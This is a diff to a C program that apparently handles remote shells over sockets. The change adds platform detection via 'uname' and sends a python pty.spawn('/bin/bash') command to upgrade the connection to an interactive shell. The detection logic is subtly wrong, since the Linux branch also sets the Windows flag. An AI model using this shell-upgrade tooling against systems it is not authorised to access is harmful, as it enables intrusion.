@@ -46,10 +46,34 @@ void sendTerminalSize(Connection *c, struct winsize w){
     send(c->socket, str, strlen(str), 0);
 }
 
-int connectionHandler(Connection *c){
+void autoDetectPlateform(Connection *c, Arguments *args){
+    send(c->socket, "uname\n", 6, 0);
+
+    char *line;
+    Connection_RecvLine(c, &line);
+    if(strcmp(line, "Linux") == 0){
+        args->unixx = true;
+        args->windows = true;
+        args->autodetect = false;
+    }else{
+        args->unixx = false;
+        args->windows = true;
+        args->autodetect = false;
+    }
+}
+
+int connectionHandler(Connection *c, Arguments *args){
+    if(args->autodetect){
+        args->autodetect = false;
+        autoDetectPlateform(c, args);
+    }
+
+    if(args->unixx){
+        send(c->socket, "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n", 48, 0);
+        sendTerminalSize(c, TerminalGetSize());
+    }
+
     TerminalStart();
-    send(c->socket, "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n", 48, 0);
-    sendTerminalSize(c, TerminalGetSize());
 
     pthread_t connectionHandlerReadingThread;
     if(pthread_create(&connectionHandlerReadingThread, NULL, connectionHandlerReadingThreadHandler, (void*)c) < 0){
@@ -88,7 +112,7 @@ int client(Connection *c, Arguments *args){
         exit_(1);
     }
 
-    connectionHandler(c);
+    connectionHandler(c, args);
 
     return 0;
 }
@@ -126,7 +150,7 @@ int server(Connection *c, Arguments *args){
 
         printf("New connection from %s:%d\n", inet_ntoa(serverNewClientConnection->addr.sin_addr), htons(serverNewClientConnection->addr.sin_port));
 
-        connectionHandler(serverNewClientConnection);
+        connectionHandler(serverNewClientConnection, args);
     }
 
     if(socketServerNewClient < 0){
